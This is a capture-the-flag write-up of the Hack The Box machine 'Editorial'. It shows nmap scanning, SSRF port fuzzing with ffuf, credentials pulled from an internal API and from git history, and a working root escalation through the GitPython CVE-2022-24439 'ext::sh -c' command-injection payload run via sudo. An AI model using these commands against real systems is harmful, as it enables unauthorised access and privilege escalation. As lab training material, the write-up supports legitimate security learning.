---
id: 958
title: "Editorial HTB Writeup"
created: 2024-12-11T14:07:26+00:00
url: https://hacklido.com/blog/958-editorial-htb-writeup
words: 2215
---

# Editorial HTB Writeup

[image]

### Task 1: How many TCP ports are listening on Editorial?

First let’s kick off with nmap scan, we will be scanning the host with nmap and some nmap scripts and see if we find anything interesting.

```
`└──╼ [★]$ sudo nmap 10.129.205.222 --min-rate 10000 -A  -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 07:59 CST
[snip]

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

[snip]

Nmap done: 1 IP address (1 host up) scanned in 35.86 seconds`
```

We see two open ports are open and running on this machine.

Answer:

```
`2`
```

### Task 2: What is the primary domain name used by the webserver on editorial box?

Whenever we visit the url, it get’s redirected to the `editorial.htb` host.  Let’s add it to our `/etc/hosts` configuration.

Answer:

```
`editorial.htb`
```

### Task 3: What relative endpoint on the webserver can cause the server to generate an outbound HTTP request?

For this let’s browse the website and capture the web requests on burp and see fi there is anything interesting. Soon we find the answer to this task just with a bit of some digging we find the endpoint. We observe the following by clicking in all options and trying to give some input URLs.

[image]

In this above diagram we have started netcat listener on port `8000` to see if the website reaches back to us and it certainly did reach back to us. Do make a note to click on `preview` option and NOT on `send book info` option. Let’s have an look at netcat listener and the response we got from it.

```
`└──╼ [★]$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [10.10.14.63] from (UNKNOWN) [10.129.205.222] 39854
GET / HTTP/1.1
Host: 10.10.14.63:8000
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive`
```

### Task 4: What TCP port is serving another webserver listening only on localhost?

We see user agent from previous task as `python-requests`, which means non http protocols and attacks will not work here, that’s an really an interesting note to make here!

Let’s try for SSRF, but we are not sure what internal IP is valid on the localhost machine, so let’s use ffuf to fuzz for valid ports, we can also do with burp community but that takes a lot of time. Make sure you enter URL as `http://127.0.0.1:FUZZ` and save the http request file as `ssrf.req`

Let’s make an wordlist for fuzzing first.

```
`seq 0 65535 > ports.txt`
```

Let’s run ffuf with the following command:

```
`sudo  ffuf -u http://editorial.htb/upload-cover -request ssrf.req -w ports.txt -ac`
```

We see an valid port which is port `5000`

```
`[snip]
5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 296ms]`
```

Answer:

```
`5000`
```

### Task 5: Which relative API endpoint returns a template that includes a default username and password?

Now we are not sure what the `API endpoint` really is. But we know an internal port and let’s send the request and see if we get something in response. Make sure to visit the url `http://127.0.0.1` via web browser and click preview, some reason the response from repeater does not work for me !

In burp we see an get response made, and we get an json request containing all the API by just entering the URL.

[image]

Let’s try each of the endpoints via curl and see if something interesting pops up. If you find that the json format from burp response is clumsy try manually curling the request and let’s beautify the response. If that does not work then maybe the request has expired and let’s retry.

```
`└──╼ [★]$ curl http://editorial.htb/static/uploads/20a12a74-4458-4d3c-b027-0970c5edd3f2 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   911  100   911    0     0   1614      0 --:--:-- --:--:-- --:--:--  1615
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}`
```

After trying all API endpoints, we find that `/api/latest/metadata/messages/authors` gives us an interesting reponse.

Answer:

```
`/api/latest/metadata/messages/authors`
```

### Task 6: Submit the flag located in the dev user’s home directory.

Note that the API is in the internal website, so we need to provide the url which is `http://127.0.0.1:5000/api/latest/metadata/messages/authors`

We go back to the repeater and perform SSRF for one last time and we get an upload file.

[image]

Now let’s understand the response we see that we have an pair of credentials in it.

```
`└──╼ [★]$ curl http://editorial.htb/static/uploads/e58f51bb-598e-491a-81a1-a89e30a5dfb6 | jq .template_mail_message -r
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   506  100   506    0     0    894      0 --:--:-- --:--:-- --:--:--   893
Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.

Your login credentials for our internal forum and authors site are:
Username: dev
Password: dev080217_devAPI!@
Please be sure to change your password as soon as possible for security purposes.

Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.

Best regards, Editorial Tiempo Arriba Team.`
```

Let’s ssh into the machine

```
`└──╼ [★]$ ssh dev@editorial.htb`
```

Once we are in, we should get the `user.txt`.

```
`dev@editorial:~$ cat user.txt`
```

### Task 7: What is the full path to the directory that contains a git repo but all the files have been deleted?

We see an `/apps` in our current directory, but in plain sight there seems to be nothing inside it. If we use `ls -la` we see `.git` directory.

```
`/home/dev/apps`
```

### Task 8: What is the prod user’s password on Editorial?

First let’s start with `git status` it shows all the files even the deleted ones that were once a part of the system.

Now let’s check at `git` logs.

```
`dev@editorial:~/apps$ git log --oneline
8ad0f31 (HEAD -> master) fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app`
```

We get `hash` value of changes now let’s check the difference between these changes, the one that seems interesting is the following hashes (second and third)

```
`dev@editorial:~/apps$ git diff 1e84a03 b73481b
diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
:...skipping...
diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass

 # -------------------------------`
```

We get the credentials to prod to be as the following:

```
`prod:080217_Producti0n_2023!@`
```

Answer:

```
`080217_Producti0n_2023!@`
```

### Task 9: What is the name of the Python script that the prod user can run as root after entering their password?

First let’s `ssh` into the prod, and let’s enter `sudo -l` we get to see the following information.

```
`prod@editorial:~$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3
        /opt/internal_apps/clone_changes/clone_prod_change.py *`
```

Answer:

```
`clone_prod_change.py`
```

### Task 10: What is name of the Python library used by `clone_prod_changes.py` to interact with Git repos?

Let’s have an look at the python script.

```
`prod@editorial:~$ cat  /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])`
```

The Python library used by `clone_prod_change.py` to interact with Git repositories is `GitPython`.

Answer:

```
`GitPython`
```

### Task 11: What version of GitPython is installed on Editorial?

We can either use `pip` or `python` for this information to be found.

```
`prod@editorial:~$ pip show gitpython
Name: GitPython
Version: 3.1.29
Summary: GitPython is a python library used to interact with Git repositories
Home-page: https://github.com/gitpython-developers/GitPython
Author: Sebastian Thiel, Michael Trier
Author-email: byronimo@gmail.com, mtrier@gmail.com
License: BSD
Location: /usr/local/lib/python3.10/dist-packages
Requires: gitdb
Required-by:
prod@editorial:~$ python3 -c "import git; print(git.__version__)"
3.1.29`
```

Answer:

```
`3.1.29`
```

### Task 12: What is the 2022 CVE ID for a command execution vulnerability in this version of GitPython?

We can find the answer with a simple google search.

Answer:

```
`CVE-_2022_-24439`
```

### Task 13: Submit the flag located in the root user’s home directory.

We get the poc code from this website.

```
`https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858`
```

After reading the poc for a while and understanding the code, since we are expected to get `root.txt` we will be using the following command to get the `root.txt`.

```
`sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c "cat% /root/root.txt% >% /tmp/root.txt"'`
```

If we have done everything perfectly so far we should be able get `root.txt` which we have copied it to the `/tmp` folder.

```
`cat /tmp/root.txt`
```
